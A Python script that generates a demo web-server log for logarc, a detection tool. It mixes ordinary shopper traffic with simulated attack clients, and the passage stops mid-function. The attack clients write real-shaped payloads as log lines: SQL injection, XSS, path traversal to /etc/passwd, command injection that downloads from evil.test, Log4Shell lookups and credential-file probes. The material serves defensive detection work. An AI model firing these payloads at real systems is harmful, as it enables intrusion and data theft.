"""Write the demo log: one file that reaches every feature the tool has.

    python samples/demo/make_demo.py

Deterministic. No randomness anywhere, so running it twice produces the same
bytes and the file can be checksummed like any other fixture.

## What this is, and what it is not

**It is a demonstration log.** Every client in it exists to make one feature of
the application visible — a window rule that needs a burst, a payload that needs
decoding, a session that needs to be cut in two. Reading the cast below is a
fair summary of what logarc can show you.

**It is not an evaluation corpus, and it must never become one.** Scoring the
rules against traffic written to suit them is marking your own homework, which
is the objection ADR-0007 raises and ADR-0008 answers. That is why no truth file
ships beside it: `logarc evaluate` wants one, cannot have one here, and should
go on using the real labelled log under `tests/data/apache-shopfront/` instead.

## Why vhost-combined and not plain combined

`apache-combined` — the format most people have — does not record the `Host`
header, and two things this tool can do need it: `referer_offsite`, and the
`session_fixation` rule that reads it. A demo log in that format would leave
those quietly unreachable, which is the wrong thing for a file whose whole job
is to show what works.

`%u` is populated for one client for the same reason: it is in every Apache
format, it holds the authenticated username, and logarc currently discards it.
Having a line that carries one makes that visible rather than theoretical.

## Keeping it current

**When a feature lands that this log cannot show, add a client here.** That is
the deal: this file is the demo, so a feature missing from it is a feature
nobody will think to demonstrate. Add a block, say in its comment what it is
for, re-run, and commit both the script and the log.
"""

from __future__ import annotations

import hashlib
import sys
from datetime import UTC, datetime, timedelta
from pathlib import Path

OUT = Path(__file__).parent / "demo.log"

#: Written by this script rather than by hand, because a rebuild changes the log
#: and a digest somebody has to remember to update is a digest that goes stale.
#: `tests/samples/test_demo_log.py` reads it and fails when it stops matching.
SUMS = Path(__file__).parent / "SHA256SUMS"

#: The site the log belongs to. Written into every line's vhost field, and the
#: thing an off-domain Referer is off-domain *from*.
SITE = "shop.test"

#: Monday. Three days of traffic, which is enough for the time band to show a
#: day-night rhythm and for one client to come back across several of them.
START = datetime(2026, 3, 9, 0, 0, tzinfo=UTC)

BROWSER = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
)
PHONE = (
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1"
)
GOOGLEBOT = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
BINGBOT = "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
SQLMAP = "sqlmap/1.8.2#stable (https://sqlmap.org)"
NIKTO = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)"
NUCLEI = "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"
FFUF = "Fuzz Faster U Fool v2.1.0-dev"
PYTHON = "python-requests/2.32.3"
CURL = "curl/8.6.0"

#: Every line written, as (moment, text). Sorted by moment at the end, because a
#: real server writes in time order and several clients are interleaved here.
lines: list[tuple[datetime, str]] = []


def at(day: int, hour: int, minute: int = 0, second: int = 0) -> datetime:
    return START + timedelta(days=day, hours=hour, minutes=minute, seconds=second)


def write(
    when: datetime,
    ip: str,
    request: str,
    status: int,
    size: int,
    *,
    agent: str = BROWSER,
    referer: str | None = None,
    user: str = "-",
) -> None:
    """One line, in Apache's `vhost_combined` shape.

    `%v:%p %h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i"`
    """
    stamp = when.strftime("%d/%b/%Y:%H:%M:%S +0000")
    ref = referer or "-"
    body = size if size else "-"
    lines.append(
        (
            when,
            f'{SITE}:443 {ip} - {user} [{stamp}] "{request}" {status} {body} "{ref}" "{agent}"',
        )
    )


def page(
    when: datetime,
    ip: str,
    path: str,
    *,
    agent: str = BROWSER,
    referer: str | None = None,
    assets: bool = True,
) -> datetime:
    """A page and the files a browser pulls in behind it.

    The assets are the point, not decoration. One click on a real site is five
    or six requests, and the episode builder folding them back into a single
    activity is one of the things worth demonstrating — without them the graph
    would be misleadingly tidy.
    """
    write(when, ip, f"GET {path} HTTP/1.1", 200, 24_800, agent=agent, referer=referer)
    if not assets:
        return when + timedelta(seconds=9)
    here = f"https://{SITE}{path}"
    for offset, asset, size in (
        (1, "/assets/css/site.css", 18_402),
        (1, "/assets/css/layout.css", 9_117),
        (2, "/assets/js/app.js", 41_233),
        (2, "/assets/img/logo.svg", 3_044),
        (3, "/assets/fonts/inter-400.woff2", 22_910),
    ):
        write(
            when + timedelta(seconds=offset),
            ip,
            f"GET {asset} HTTP/1.1",
            200,
            size,
            agent=agent,
            referer=here,
        )
    return when + timedelta(seconds=9)


# ---------------------------------------------------------------------------
# Ordinary traffic. Roughly two thirds of the file, because a log that is mostly
# attacks is not a log — it is a test case, and it makes the detection look
# easier than it is.
# ---------------------------------------------------------------------------


def shopper_who_buys(ip: str, day: int, hour: int, agent: str = BROWSER) -> None:
    """The whole journey, which is what the `action/` rule packs were written for.

    Browse, search, look at a product, put it in the basket, sign in, check out,
    pay. Every step gets a name of its own in the reconstruction — `Search`,
    `Modify Cart`, `Checkout`, `Payment` — rather than the bare "Non-idempotent
    Request" they all used to share.
    """
    t = at(day, hour)
    t = page(t, ip, "/", agent=agent)
    t = page(t, ip, "/c/lighting", agent=agent, referer=f"https://{SITE}/")
    write(
        t,
        ip,
        "GET /search?q=desk+lamp HTTP/1.1",
        200,
        12_880,
        agent=agent,
        referer=f"https://{SITE}/c/lighting",
    )
    t += timedelta(seconds=4)
    write(t, ip, "GET /api/autocomplete?q=desk HTTP/1.1", 200, 940, agent=agent)
    t += timedelta(seconds=6)
    t = page(t, ip, "/p/4417", agent=agent, referer=f"https://{SITE}/search?q=desk+lamp")
    write(t, ip, "GET /api/stock?sku=4417 HTTP/1.1", 200, 210, agent=agent)
    t += timedelta(seconds=11)
    write(
        t,
        ip,
        "POST /api/cart/add HTTP/1.1",
        200,
        480,
        agent=agent,
        referer=f"https://{SITE}/p/4417",
    )
    t += timedelta(seconds=20)
    t = page(t, ip, "/cart", agent=agent, referer=f"https://{SITE}/p/4417")
    write(t, ip, "GET /login HTTP/1.1", 200, 8_120, agent=agent, referer=f"https://{SITE}/cart")
    t += timedelta(seconds=14)
    write(t, ip, "POST /login HTTP/1.1", 302, 0, agent=agent, referer=f"https://{SITE}/login")
    t += timedelta(seconds=3)
    write(
        t, ip, "POST /wishlist/add HTTP/1.1", 200, 210, agent=agent, referer=f"https://{SITE}/cart"
    )
    t += timedelta(seconds=8)
    t = page(t, ip, "/checkout", agent=agent, referer=f"https://{SITE}/cart")
    write(
        t,
        ip,
        "POST /payment/card HTTP/1.1",
        302,
        0,
        agent=agent,
        referer=f"https://{SITE}/checkout",
    )
    t += timedelta(seconds=5)
    write(t, ip, "GET /account/orders HTTP/1.1", 200, 14_200, agent=agent)
    t += timedelta(seconds=40)
    write(
        t, ip, "GET /logout HTTP/1.1", 302, 0, agent=agent, referer=f"https://{SITE}/account/orders"
    )


def shopper_who_leaves(ip: str, day: int, hour: int) -> None:
    """The same shape, stopping at the basket.

    Worth its own client because "put something in the cart and never came back"
    is a question somebody will want to ask, and answering it needs the absence
    of a Checkout to be as visible as its presence.
    """
    t = at(day, hour)
    t = page(t, ip, "/")
    t = page(t, ip, "/c/power-tools", referer=f"https://{SITE}/")
    t = page(t, ip, "/p/2280", referer=f"https://{SITE}/c/power-tools")
    write(t, ip, "POST /api/cart/add HTTP/1.1", 200, 480, referer=f"https://{SITE}/p/2280")
    t += timedelta(seconds=30)
    page(t, ip, "/cart", referer=f"https://{SITE}/p/2280")


def returning_customer(ip: str, day: int, hour: int) -> None:
    """Signs in, reads old orders, tracks a parcel. No browsing at all.

    A different shape from the two above, and the one that makes `Order History`
    and `Order Tracking` appear on their own rather than at the end of a
    purchase.
    """
    t = at(day, hour)
    write(t, ip, "GET /login HTTP/1.1", 200, 8_120, agent=PHONE)
    t += timedelta(seconds=12)
    # Forgot it, reset it, then sign in — the ordinary version of the sequence
    # the password guesser at 192.0.2.103 is imitating.
    write(
        t,
        ip,
        "POST /account/password-reset HTTP/1.1",
        200,
        1_120,
        agent=PHONE,
        referer=f"https://{SITE}/login",
    )
    t += timedelta(seconds=35)
    write(t, ip, "POST /login HTTP/1.1", 302, 0, agent=PHONE, referer=f"https://{SITE}/login")
    t += timedelta(seconds=2)
    write(t, ip, "GET /account/orders HTTP/1.1", 200, 14_200, agent=PHONE)
    t += timedelta(seconds=18)
    write(t, ip, "GET /account/orders/99214 HTTP/1.1", 200, 9_880, agent=PHONE)
    t += timedelta(seconds=25)
    write(t, ip, "GET /track/99214 HTTP/1.1", 200, 4_010, agent=PHONE)


def window_shopper(ip: str, day: int, hour: int) -> None:
    """Searches over and over and buys nothing.

    **"wall bracket" is not a coincidence — do not change these search terms.**

    Ingest alone reads all five searches as ordinary shopping. Turn CRS on with
    `logarc enrich` and rule 932236 calls `wall bracket` a Unix command
    injection, at critical severity, three times — because `wall` is a real Unix
    command and CRS is matching the command name followed by an argument.

    Nothing is wrong with CRS here; it is doing what a generic ruleset must do
    without knowing that this site sells brackets. This client was written to
    show a hardware shop's customer being filed as an attacker by the most
    widely deployed WAF ruleset in the world, and until 2026-09-22 logarc
    repeated the accusation.

    It no longer does. Measured on 237,278 real requests, 932236 accused 22
    ordinary product searches and named no real attack, so it is withheld from
    naming an activity. CRS's detection still travels with the request as
    evidence — open this client with CRS on and each search is labelled a
    search, with 932236 attached beneath it. The demonstration is now both
    halves at once: what CRS says, and what this tool concluded from it.

    If 932236 is ever restored, this client is the one that will show it.
    """
    t = at(day, hour)
    for term in ("oak shelf", "wall bracket", "led strip", "socket set", "paint roller"):
        write(t, ip, f"GET /search?q={term.replace(' ', '+')} HTTP/1.1", 200, 12_400)
        t += timedelta(seconds=7)
        write(t, ip, f"GET /api/autocomplete?q={term.split()[0]} HTTP/1.1", 200, 880)
        t += timedelta(seconds=40)


def mobile_app(ip: str, day: int, hour: int) -> None:
    """Almost pure API traffic — what a phone app looks like from the server.

    Included because `api_call` is easy to forget when every other ordinary
    client is a browser fetching pages and assets.
    """
    t = at(day, hour)
    for minute in range(0, 24, 3):
        moment = t + timedelta(minutes=minute)
        write(moment, ip, "GET /api/v1/feed HTTP/1.1", 200, 7_420, agent=PHONE)
        write(
            moment + timedelta(seconds=2),
            ip,
            "GET /api/stock?sku=1188 HTTP/1.1",
            200,
            210,
            agent=PHONE,
        )
        write(moment + timedelta(seconds=5), ip, "GET /api/cart HTTP/1.1", 200, 340, agent=PHONE)


def price_watcher(ip: str, day: int, hour: int) -> None:
    """A script doing something entirely ordinary, and the reason it is here.

    `python-requests` used to be filed under `reconnaissance`, which made every
    harmless script an attacker — twenty false alarms on the measured corpus,
    the whole of its 0.765%. It is `crawling` now: a User-Agent can say
    "automated" and cannot say "hostile". This client is the regression test a
    person can see.
    """
    t = at(day, hour)
    for sku in (4417, 2280, 1188, 9002, 3350, 7719):
        write(t, ip, f"GET /p/{sku} HTTP/1.1", 200, 24_800, agent=PYTHON)
        t += timedelta(seconds=3)
        write(t, ip, f"GET /api/stock?sku={sku} HTTP/1.1", 200, 210, agent=PYTHON)
        t += timedelta(seconds=9)


def crawler(ip: str, agent: str, day: int, hour: int, pages: int) -> None:
    """A search engine working through the catalogue.

    Fetches `robots.txt` and `sitemap.xml` first, which is exactly what
    `project_metadata_probe` must *not* claim — they sit beside `/LICENSE` and
    `/.gitignore` in the tree and are the opposite of a probe.
    """
    t = at(day, hour)
    write(t, ip, "GET /robots.txt HTTP/1.1", 200, 113, agent=agent)
    t += timedelta(seconds=2)
    write(t, ip, "GET /sitemap.xml HTTP/1.1", 200, 8_640, agent=agent)
    t += timedelta(seconds=4)
    for index in range(pages):
        write(t, ip, f"GET /p/{1000 + index * 37} HTTP/1.1", 200, 24_800, agent=agent)
        t += timedelta(seconds=6)
        if index % 5 == 4:
            write(
                t,
                ip,
                f"GET /c/{['lighting', 'storage', 'safety'][index % 3]} HTTP/1.1",
                200,
                29_700,
                agent=agent,
            )
            t += timedelta(seconds=6)


def signed_in_admin(ip: str, day: int, hour: int) -> None:
    """The only client whose lines carry a username, and it is there to be a
    question rather than a feature.

    `%u` is in every Apache format and logarc drops it — the parser reads it and
    `NormalizedEvent` has nowhere to put it. Idea 23 on the board is about
    grouping by who rather than by where, and this client is what that idea
    would have to work from. Meanwhile it also gives `admin_area_probe` a
    counter-example: `/admin` answered 200 to a signed-in user is not a probe.
    """
    t = at(day, hour)
    write(t, ip, "POST /login HTTP/1.1", 302, 0)
    t += timedelta(seconds=2)
    for path in ("/admin", "/admin/orders", "/admin/stock", "/admin/reports"):
        write(
            t,
            ip,
            f"GET {path} HTTP/1.1",
            200,
            18_900,
            user="alice",
            referer=f"https://{SITE}/admin",
        )
        t += timedelta(seconds=45)


# ---------------------------------------------------------------------------
# Attacks. One client per thing worth showing, so that clicking a name in the
# window and reading its story is a complete demonstration on its own.
# ---------------------------------------------------------------------------


def sqli_campaign(ip: str, day: int, hour: int) -> None:
    """sqlmap, in the four shapes it actually sends.

    The payloads are percent-encoded because that is how they arrive, and
    because the evidence panel decoding them back into readable SQL is one of
    the things worth showing. `%2527` is double-encoded on purpose: the decode
    depth is itself a signal, and `multiply_encoded_request` reads it.
    """
    t = at(day, hour)
    probes = [
        "/search?q=oak%27",
        "/search?q=oak%27%20AND%20%271%27%3D%271",
        "/search?q=oak%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--%20",
        "/search?q=oak%27%20ORDER%20BY%201--%20aBcD",
        "/search?q=oak%27%20AND%20SLEEP%285%29--%20",
        "/p/4417?id=1%20AND%201%3DCONVERT%28int%2C%40%40version%29--",
        "/search?q=oak%2527%2520OR%25201%3D1--%2520",
        "/api/v1/feed?sort=id%3BSELECT%20pg_sleep%2810%29--",
        # Reading the database's own catalogue — the step between "there is an
        # injection here" and knowing what to steal.
        "/p/4417?id=1%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20",
        # A second statement bolted onto the first. Destructive, and the reason
        # stacked queries are graded apart from the ones that only read.
        "/p/4417?id=1%3B%20DROP%20TABLE%20users--%20",
    ]
    for probe in probes:
        write(t, ip, f"GET {probe} HTTP/1.1", 200, 12_400, agent=SQLMAP)
        t += timedelta(seconds=3)


def directory_enumeration(ip: str, day: int, hour: int) -> None:
    """A wordlist, fast. Twenty-five misses across twenty-five paths in fifty
    seconds — over the rule's twenty requests and fifteen distinct paths inside
    sixty, and nothing static among them.

    This is the window rule that no single line reveals. Each request on its own
    is a missing page; the run is the finding.
    """
    t = at(day, hour)
    wordlist = [
        "/admin.php",
        "/backup.zip",
        "/db.sql",
        "/config.bak",
        "/old",
        "/test",
        "/phpmyadmin/",
        "/wp-admin/",
        "/administrator/",
        "/.svn/entries",
        "/server-status",
        "/cgi-bin/test.cgi",
        "/dump.sql",
        "/site.tar.gz",
        "/backup/",
        "/uploads/",
        "/private/",
        "/tmp/",
        "/logs/",
        "/debug.php",
        "/install.php",
        "/setup.php",
        "/adminer.php",
        "/shell.php",
        "/info.php",
    ]
    for path in wordlist:
        write(t, ip, f"GET {path} HTTP/1.1", 404, 7_427, agent=FFUF)
        t += timedelta(seconds=2)


def low_and_slow(ip: str, day: int, hour: int) -> None:
    """The same idea, paced to slip under the fast rule: nine misses over four
    minutes. `directory_enumeration` wants twenty in sixty seconds and never
    sees them; `directory_enumeration_low_slow` wants eight in three hundred and
    does."""
    t = at(day, hour)
    for path in (
        "/.env",
        "/.git/config",
        "/wp-config.php.bak",
        "/api/v1/../../etc/hosts",
        "/composer.json",
        "/package-lock.json",
        "/.aws/credentials",
        "/storage/logs/laravel.log",
        "/config/database.yml",
    ):
        write(t, ip, f"GET {path} HTTP/1.1", 404, 7_427, agent=CURL)
        t += timedelta(seconds=27)


def credential_attack(ip: str, day: int, hour: int) -> None:
    """Twelve refused sign-ins to one path inside three minutes.

    The rule wants five or more failures at no more than three distinct paths,
    which is what separates a password guesser from somebody who mistyped once.
    """
    t = at(day, hour)
    for _ in range(12):
        write(
            t, ip, "POST /login HTTP/1.1", 401, 512, agent=PYTHON, referer=f"https://{SITE}/login"
        )
        t += timedelta(seconds=14)


def bulk_registration(ip: str, day: int, hour: int) -> None:
    """Seven refused sign-ups in two minutes — a registration flood, and the
    newest rule in the pack. Kept separate from the password guesser above
    because they look alike in shape and mean different things: one is trying to
    get into an account, the other is trying to make them."""
    t = at(day, hour)
    for _ in range(7):
        write(t, ip, "POST /register HTTP/1.1", 400, 380, agent=PYTHON)
        t += timedelta(seconds=17)


def forced_browsing(ip: str, day: int, hour: int) -> None:
    """Sixteen requests to admin paths that answer in three different ways.

    Twelve refusals first — 403 rather than 404, and that distinction is the
    whole rule: a miss means the thing is not there, a refusal means it is there
    and guarded, and somebody working through a list of guarded things is doing
    something different from somebody mapping what exists.

    Then two redirects, bounced to a login page rather than refused outright,
    which `admin_area_redirect` reads on its own. They live on this client
    rather than on the signed-in admin at 198.51.100.20 for a reason that has
    since expired — the rule was `access_control` when this was written and
    flagged the one client whose job is to be a clean counter-example. It is
    `authentication` at `info` now and would no longer do that. The requests
    stay here because they are also true of this client.

    And two successes last, which is what the other two answers are for. A
    client that collects both a refusal and a success on admin paths got through
    somewhere, and `forced_browsing_succeeded` is the only rule in the tree that
    can say so.
    """
    t = at(day, hour)
    for path in (
        "/admin/users",
        "/admin/settings",
        "/admin/export",
        "/internal/metrics",
        "/staff/",
        "/reports/finance.pdf",
        "/admin/keys",
        "/billing/invoices",
        "/admin/users",
        "/admin/logs",
        "/internal/debug",
        "/staff/rota",
    ):
        write(t, ip, f"GET {path} HTTP/1.1", 403, 1_180, agent=CURL)
        t += timedelta(seconds=9)
    for path in ("/admin", "/phpmyadmin"):
        write(t, ip, f"GET {path} HTTP/1.1", 302, 0, agent=CURL)
        t += timedelta(seconds=9)

    # Two routes that never learned to check a role, so they answer 200 to the
    # same client the twelve above refused. Without these the demo log has no
    # request where somebody who should not be there got through.
    for path in ("/admin/ping", "/admin/template"):
        write(t, ip, f"GET {path} HTTP/1.1", 200, 940, agent=CURL)
        t += timedelta(seconds=9)


def server_errors(ip: str, day: int, hour: int) -> None:
    """Six requests that make the application fall over inside two minutes.

    Whatever is being sent, a server answering 500 repeatedly is telling you
    something the request line alone does not.
    """
    t = at(day, hour)
    for path in (
        "/api/v1/feed?page=-1",
        "/api/v1/feed?page=99999999999999999999",
        "/search?q=%00%00%00",
        "/p/4417?qty=1e309",
        "/api/cart?id[]=1&id[]=2",
        "/checkout?step=%7B%7D",
    ):
        write(t, ip, f"GET {path} HTTP/1.1", 500, 0, agent=CURL)
        t += timedelta(seconds=15)


def path_traversal(ip: str, day: int, hour: int) -> None:
    """The same file, asked for four ways.

    Plain, once-encoded, twice-encoded, and with a null byte to truncate the
    extension. Normalisation collapses all four to the same thing before any
    rule sees them, which is why one rule catches all four — and that is the
    point worth demonstrating.
    """
    t = at(day, hour)
    for probe in (
        "/download?file=../../../../etc/passwd",
        "/download?file=..%2f..%2f..%2f..%2fetc%2fpasswd",
        "/download?file=..%252f..%252fetc%252fpasswd",
        "/download?file=../../etc/passwd%00.pdf",
        "/download?file=..%5c..%5cwindows%5cwin.ini",
    ):
        write(t, ip, f"GET {probe} HTTP/1.1", 403, 1_180, agent=CURL)
        t += timedelta(seconds=8)


def php_attacks(ip: str, day: int, hour: int) -> None:
    """The shapes that took PHP detection from 15% to 68%.

    An open tag, a stream wrapper, a superglobal, a decoding chain, and a call
    with a comment wedged between the name and its bracket — which is an evasion
    the corpus actually uses.
    """
    t = at(day, hour)
    for probe in (
        "/index.php?page=%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E",
        "/index.php?page=php%3A//filter/convert.base64-encode/resource%3Dconfig",
        "/index.php?tpl=%24_GET%5Bcmd%5D",
        "/index.php?data=eval%28base64_decode%28%27cGhwaW5mbygpOw%3D%3D%27%29%29",
        "/index.php?x=system%2F%2Acomment%2A%2F%28%27whoami%27%29",
        "/index.php?inc=https%3A//evil.test/shell.php",
        # Asking the interpreter about itself before asking it for
        # anything: what version, what is switched on, what is loaded.
        "/index.php?x=phpinfo%28%29%3B",
        "/index.php?x=allow_url_include%3D1",
        # Reading a file, calling a function, and handing in a
        # serialized object — three separate rules, three separate
        # things an attacker does once the interpreter answers.
        "/index.php?x=file_get_contents%28%27/etc/passwd%27%29",
        "/index.php?x=print_r%28%24_SERVER%29%3B",
        "/index.php?u=O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22name%22%3B%7D",
        # And once `system(` is filtered, the same call without writing it:
        # the name wrapped and called, then a variable called as a function.
        "/index.php?x=%28system%29%28%27id%27%29%3B",
        "/index.php?x=%24f%28%27id%27%29",
    ):
        write(t, ip, f"GET {probe} HTTP/1.1", 200, 4_120, agent=CURL)
        t += timedelta(seconds=7)


def xss_attempts(ip: str, day: int, hour: int) -> None:
    """Script tag, event handler, and a javascript: URL in a redirect parameter.

    Sent with an ordinary browser User-Agent, and that is deliberate. The first
    draft used Nikto's, and the episode came back named `Security Scanner
    User-Agent` — critical severity beats the XSS rules' medium, so the client
    written to demonstrate XSS demonstrated something else. A browser here is
    also the truthful case: cross-site scripting is aimed at a person's browser
    and usually arrives from one.
    """
    t = at(day, hour)
    for probe in (
        "/search?q=%3Cscript%3Ealert%281%29%3C/script%3E",
        "/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
        "/login?next=javascript%3Aalert%28document.cookie%29",
        "/search?q=%3Csvg%2Fonload%3Dfetch%28%27//evil.test%27%29%3E",
        # Then the shapes that get past a filter looking for `<script`: the
        # bare call a reflected probe executes, a tag spelled with spaces, and
        # script reached through a style attribute.
        "/search?q=%22%3Balert%281%29%2F%2F",
        "/search?q=%3Cd%20i%20a%20l%20o%20g%20open%3E",
        "/c/lighting?view=x%3Aurl%28javascript%3Aalert%281%29%29",
        # And the point of all of it: script that plants a session cookie.
        "/search?q=%3Cscript%3Edocument.cookie%3D%27sid%3Dattacker%3Bexpires%3DFri%2C%201%20Jan%202027%27%3C/script%3E",
    ):
        write(t, ip, f"GET {probe} HTTP/1.1", 200, 12_400, agent=BROWSER)
        t += timedelta(seconds=6)


def command_injection(ip: str, day: int, hour: int) -> None:
    """Unix first, then Windows batch.

    The Windows lines were here before anything could read them — family 932 sat
    at 9% and `attack/windows.yaml` did not exist — on the principle that a demo
    log containing only what the rules already catch flatters the tool, and a gap
    is easier to argue about when you can point at it.

    **The pack exists now**, and these are the lines it was written from: a FOR
    loop with a switch, `cmd.exe /c`, PowerShell with an encoded command, and an
    `if exist` test. Each of the three rules in that pack fires on one of them,
    which is how the demo log keeps its promise that every rule is reachable.
    """
    t = at(day, hour)
    for probe in (
        "/ping?host=127.0.0.1%3Bcat%20/etc/passwd",
        "/ping?host=127.0.0.1%7Cid",
        "/ping?host=%24%28whoami%29",
        "/ping?host=127.0.0.1%0Awget%20http%3A//evil.test/x.sh",
        "/ping?host=for%20%2Ff%20%22tokens%3D%2A%22%20%25%25G%20IN%20%28%27dir%20%2Fb%27%29%20DO%20echo%20%25%25G",
        "/ping?host=cmd.exe%20%2Fc%20whoami",
        "/ping?host=powershell%20-enc%20SQBFAFgA",
        # `if exist … ` — the batch conditional, which is the third shape in
        # the pack and the one the other lines here do not carry.
        "/ping?host=if%20exist%20c%3A%5Cwindows%5Csystem32%20echo%20yes",
        # Then the forms written to get past a filter that knows those words:
        # a glob standing in for /etc/passwd, brace expansion, a command name
        # split by quotes, an empty substitution inside `ping`, a shell told
        # to run a command, and Windows' own downloader.
        "/ping?host=127.0.0.1%3Bcat%20/etc/pa%5Bs%5Dswd",
        "/ping?host=%7B,ifconfig%7D",
        "/ping?host=127.0.0.1%3B%27wh%27oami",
        "/ping?host=pi%24%28%29ng%20127.0.0.1",
        "/ping?host=127.0.0.1%3Bbash%20-c%20%22id%22",
        "/ping?host=127.0.0.1%26certutil%20-urlcache%20-f%20http%3A//evil.test/x.exe",
    ):
        write(t, ip, f"GET {probe} HTTP/1.1", 500, 0, agent=CURL)
        t += timedelta(seconds=11)
    # A command line sent as the User-Agent, for an application that writes
    # its visitors' agents somewhere a shell later reads.
    t += timedelta(seconds=11)
    write(t, ip, "GET / HTTP/1.1", 200, 24_800, agent="wget http://evil.test/x.sh -O /tmp/x")
    t += timedelta(seconds=11)
    # The contact form, which hands its fields to the mail server: an SMTP
    # command smuggled into one of them.
    write(
        t,
        ip,
        "GET /contact?subject=hi%0d%0arcpt%20to:%3Cvictim@example.com%3E HTTP/1.1",
        400,
        96,
        agent=CURL,
    )


def java_attacks(ip: str, day: int, hour: int) -> None:
    """The Java-stack shapes, which are the ones the PHP pack cannot see.

    Log4Shell in three places, because the lookup fires wherever the string
    lands and the User-Agent is the classic one; an external entity in an
    uploaded document; and a template expression that the server evaluates
    instead of printing. This is the client that shows `attack/java.yaml`
    earning its place as a separate file from `attack/php.yaml`.
    """
    t = at(day, hour)
    write(
        t,
        ip,
        "GET /search?q=%24%7Bjndi%3Aldap%3A//evil.test/a%7D HTTP/1.1",
        200,
        12_400,
        agent=CURL,
    )
    t += timedelta(seconds=12)
    write(t, ip, "GET /api/v1/feed HTTP/1.1", 200, 7_420, agent="${jndi:ldap://evil.test/b}")
    t += timedelta(seconds=15)
    write(t, ip, "GET /login HTTP/1.1", 200, 8_120, agent=CURL, referer="${jndi:rmi://evil.test/c}")
    t += timedelta(seconds=18)
    write(
        t,
        ip,
        "POST /api/import?doc=%3C%21DOCTYPE%20foo%20SYSTEM%20%22file%3A///etc/passwd%22%3E "
        "HTTP/1.1",
        500,
        0,
        agent=CURL,
    )
    t += timedelta(seconds=14)
    write(t, ip, "GET /search?q=%7B%7B7%2A7%7D%7D HTTP/1.1", 200, 12_400, agent=CURL)
    t += timedelta(seconds=9)
    write(t, ip, "GET /search?q=%24%7B7%2A7%7D HTTP/1.1", 200, 12_400, agent=CURL)


def perl_and_node(ip: str, day: int, hour: int) -> None:
    """The two stacks the technology packs were written for last, in one run.

    Perl first. `@{[ ... ]}` is array interpolation: inside a string Perl
    evaluates whatever is in the brackets, so a template that puts user input
    into one runs it. That sequence has no other use in the language, which is
    why a single pattern closed thirty-five corpus cases.

    Then Node, in the three shapes it arrives in. A global reached through a
    *named* member — `process.env`, never a bare `process.`, because the corpus
    certifies the bare one harmless. Prototype pollution, which is the only
    attack in this whole log that lives in the parameter *name* rather than its
    value. And a loop that cannot end, which is a denial of service rather than
    a way in: `while(true)` runs until somebody kills the process, while the
    corpus's harmless `while(!true)` never runs at all.

    One client rather than two because the shapes belong to the same visit —
    somebody rattling every interpreter a template might be sitting on.
    """
    t = at(day, hour)
    for probe in (
        # Perl: the plain form, a shell-out, and one that never closes its brace
        # — a payload that failed to parse was still sent.
        "/search?q=%40%7B%5Bsystem%20%27id%27%5D%7D",
        "/search?q=%40%7B%5Bqx%7Bwhoami%7D%5D%7D",
        "/search?q=%40%7B%5Bsystem%20%27id%27%5D",
        # Node: a global with something named off it.
        "/render?tpl=%23%7Bprocess.env%7D",
        "/render?tpl=%23%7Brequire.main.constructor._load%28%27child_process%27%29%7D",
        # Prototype pollution, in the parameter name.
        "/cart/update?__proto__%5BisAdmin%5D=true",
        "/cart/update?constructor%5Bprototype%5D%5BisAdmin%5D=true",
        # A loop with no exit.
        "/render?eval=while%28true%29%3B",
        # node-serialize's marker, which the library evaluates.
        "/profile?data=%7B%22rce%22%3A%22_%24%24ND_FUNC%24%24_function%28%29%7Bid%7D%28%29%22%7D",
    ):
        write(t, ip, f"GET {probe} HTTP/1.1", 500, 0, agent=CURL)
        t += timedelta(seconds=11)


def django_orm_probe(ip: str, day: int, hour: int) -> None:
    """Somebody who found that the shop's API passes its query string into the ORM.

    First a password hash read out one character at a time. `__startswith` answers
    yes or no, and the size of the response is the answer: a longer body means
    the prefix still matches. Then a question no filter asks, which accounts
    carry an admin flag in their JSON profile.

    A lookup alone would prove nothing, since `?price__lte=100` is how Django
    filters. It is what each lookup is aimed at, a password and a privilege
    flag, that makes these the log's only ORM attacks.
    """
    t = at(day, hour)
    for prefix, size in (("p", 1840), ("pb", 1840), ("pbk", 1840), ("pbx", 96), ("pbkd", 1840)):
        write(
            t,
            ip,
            f"GET /api/users?user__password__startswith={prefix} HTTP/1.1",
            200,
            size,
            agent=CURL,
        )
        t += timedelta(seconds=4)
    write(t, ip, "GET /api/users?profile__data__has_key=is_admin HTTP/1.1", 200, 612, agent=CURL)


def database_fingerprint(ip: str, day: int, hour: int) -> None:
    """A tool working out which database answers behind the stock API.

    First the probe every injection starts with, a whole value that is a
    comparison. Then one dialect at a time: SQLite's GLOB, which nothing but
    SQLite understands, then PostgreSQL's cast and its large-object calls,
    which read files off the database host. The 500s are the answer it wanted.
    The last request moves the payload into the User-Agent, which the shop's
    analytics stores, and which the access log records in full.
    """
    t = at(day, hour)
    probes = [
        ("/api/stock?sku=1%3D1", 200, 412),
        ("/api/stock?sku=1%20in%20(select%201)", 200, 412),
        ("/api/stock?sku=%27or(id%20glob%201)--", 400, 96),
        ("/api/stock?sku=password::int", 500, 1_204),
        ("/api/stock?sku=lo_import(%27/etc/passwd%27)", 500, 1_180),
    ]
    for probe, status, size in probes:
        write(t, ip, f"GET {probe} HTTP/1.1", status, size, agent=CURL)
        t += timedelta(seconds=5)
    write(
        t,
        ip,
        "GET /api/stock?sku=4417 HTTP/1.1",
        500,
        1_196,
        agent="encode(lo_get(16400),'base64')::int",
    )


def nosql_and_shellshock(ip: str, day: int, hour: int) -> None:
    """Two old-stack probes that share nothing but this client.

    A Mongo-style operator smuggled into a query parameter, then Shellshock —
    which is not in the URL at all. It is in the User-Agent, and the target is a
    CGI script, so it is the clearest case in the log of why the rules read
    headers and not just the request line.
    """
    t = at(day, hour)
    for probe in (
